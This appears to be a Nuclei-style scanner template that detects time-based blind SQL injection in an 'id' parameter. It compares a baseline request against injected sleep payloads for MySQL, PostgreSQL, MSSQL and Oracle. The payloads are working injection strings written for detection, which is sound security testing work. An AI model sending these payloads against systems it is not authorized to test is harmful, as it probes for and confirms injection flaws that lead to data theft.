id: sqli-time-based-blind-detection

info:
  name: SQL Injection - Time-Based Blind Detection (Non-Destructive)
  author: achraf-chehboun
  severity: critical
  description: |
    Detects time-based blind SQL injection using database-native sleep functions.
    Uses an 8-second delay with differential comparison (injected minus baseline >= 6s)
    to eliminate false positives from slow servers. All payloads are read-only.
    Supports MySQL (SLEEP), PostgreSQL (pg_sleep), MSSQL (WAITFOR DELAY), and
    Oracle (DBMS_PIPE.RECEIVE_MESSAGE).
  reference:
    - https://owasp.org/Top10/A03_2021-Injection/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    max-request: 12
  tags: owasp-top10,sqli,injection,time-based,blind,detection-only

http:
  # MySQL SLEEP
  - raw:
      - |
        GET /?id=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /?id=1'%20AND%20SLEEP(8)--+- HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        name: mysql-sleep-confirmed
        dsl:
          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'

  # MySQL IF-based
  - raw:
      - |
        GET /?id=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /?id=1'%20AND%20(SELECT%20IF(1=1,SLEEP(8),0))--+- HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        name: mysql-if-sleep-confirmed
        dsl:
          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'

  # PostgreSQL pg_sleep
  - raw:
      - |
        GET /?id=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /?id=1'%3B%20SELECT%20pg_sleep(8)--+- HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        name: postgresql-sleep-confirmed
        dsl:
          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'

  # PostgreSQL CASE-based
  - raw:
      - |
        GET /?id=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /?id=1'%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20pg_sleep(8)%20ELSE%20pg_sleep(0)%20END)--+- HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        name: postgresql-case-sleep-confirmed
        dsl:
          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'

  # MSSQL WAITFOR DELAY
  - raw:
      - |
        GET /?id=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /?id=1'%3B%20WAITFOR%20DELAY%20'0:0:8'--+- HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        name: mssql-waitfor-confirmed
        dsl:
          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'

  # Oracle DBMS_PIPE.RECEIVE_MESSAGE
  - raw:
      - |
        GET /?id=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /?id=1'%20AND%201=DBMS_PIPE.RECEIVE_MESSAGE('a',8)--+- HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        name: oracle-pipe-delay-confirmed
        dsl:
          - 'duration_2 >= 8 && duration_1 < 5 && (duration_2 - duration_1) >= 6'
